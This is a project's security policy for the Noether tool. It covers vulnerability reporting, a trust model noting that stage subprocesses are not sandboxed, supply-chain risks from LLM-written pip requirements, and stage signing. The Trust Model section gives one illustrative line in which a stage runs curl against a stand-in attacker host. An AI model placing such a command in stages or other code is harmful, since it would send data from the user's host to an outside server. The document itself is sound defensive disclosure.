# Security Policy

## Reporting a Vulnerability

If you find a security bug in Noether, please report it privately via a
GitHub Security Advisory on <https://github.com/alpibrusl/noether> or email
`security@alpibru.com`. Do not open a public issue until a fix has shipped.

Include: description, steps to reproduce, affected version, your PoC if any.

## Supported Versions

| Version | Status                 |
|---------|------------------------|
| 0.4.x   | Active — security fixes backported |
| < 0.4   | Not supported          |

## Trust Model

Noether's L1 (Nix Execution Layer) provides **reproducibility, not
isolation**. This is the single most important thing to understand before
running any stage you did not write.

### What the Nix-pinned runtime does

- Pins the exact language runtime (Python, Node, Bash) and its declared
  dependencies to content-addressed Nix store paths.
- Guarantees the same stage produces the same output on any host that has
  Nix and the matching store paths.
- Blocks network access during **Nix evaluation** (build time).

### What it does NOT do

- **It does not sandbox the subprocess.** When a stage runs, the child
  process inherits the host user's:
  - Filesystem access (read `~/.ssh/*`, read env files, write anywhere)
  - Network (arbitrary outbound HTTP, DNS, raw sockets)
  - Environment variables (all parent env is inherited)
  - Process privileges
- A stage can legally do `import os; os.system("curl attacker.example/...")`.
- The `__direct__` venv fallback (used when a stage declares
  `# requires:` pip packages) bypasses Nix entirely and runs in the host's
  Python.

### What this means in practice

**Safe:** running stages you wrote, stages from `stdlib`, stages you read
end-to-end before running.

**Not safe:** running a stage pulled from a registry you don't fully trust,
running a stage synthesized by an LLM without review, running any stage on
a host with credentials you aren't willing to risk.

**If you need isolation**, wrap the child process yourself — `bwrap`,
`firejail`, `nsjail` with seccomp, a throwaway container, or a VM. Noether
does not ship this. Contributions welcome.

## Composition Verification

The composition engine type-checks every edge of a graph before executing
it, using structural subtyping. **This verifies graph topology only.** It
does not verify that a stage's implementation honours its declared
signature — a Python stage typed as `Text → Number` can return a string at
runtime.

Said differently:
- The type checker catches: `Sequential(a, b)` where `a.output` is not a
  subtype of `b.input`.
- The type checker does **not** catch: a stage body that returns the wrong
  shape, crashes, or silently swallows an error.

## LLM-generated Stage Requirements

The Nix executor reads `# requires: pkg==version` headers from Python
stage bodies to build a venv with pip-installed dependencies. For stages
synthesized by an LLM (or any untrusted author), this is a supply-chain
hazard — typosquatted or malicious package names can be injected.

Mitigations in place:
- Each `# requires:` entry is validated for character set (letters, digits,
  `_`, `-`, `.`, and a limited set of version punctuation).
- Package pinning (`pkg==version`) is required by default. Without pinning,
  the entry is rejected and the runtime falls back to the default
  Nix-provided Python (no pip installs).
- `NOETHER_ALLOW_UNPINNED_PIP=1` lifts the pinning requirement for local
  dev only. Do not set this in production.

Not mitigated (yet):
- There is no allowlist of known-good package names.
- There is no hash verification (`pip install --require-hashes`).
- Once a valid spec passes validation, pip downloads from PyPI using the
  ambient pip configuration.

If you are publishing compositions others will run via this registry,
review every `# requires:` entry before tagging as `Active`.

## Networked Components

Noether itself ships no network listeners. The `noether` CLI is a local
tool. A separate repository (`noether-cloud`) hosts the registry server;
its trust model is documented in [`noether-cloud/SECURITY.md`](https://github.com/alpibrusl/noether-cloud/blob/main/SECURITY.md)
(if you have access).

## Signing

Stages may carry an Ed25519 signature over their canonical signature
bytes. `noether stage verify <id>` checks the signature against the
declared pubkey. See `noether-core/src/stage/signing.rs` for details.

Signing proves who signed the stage and that its signature bytes have not
been tampered with. It does **not** prove the implementation does what the
description says.
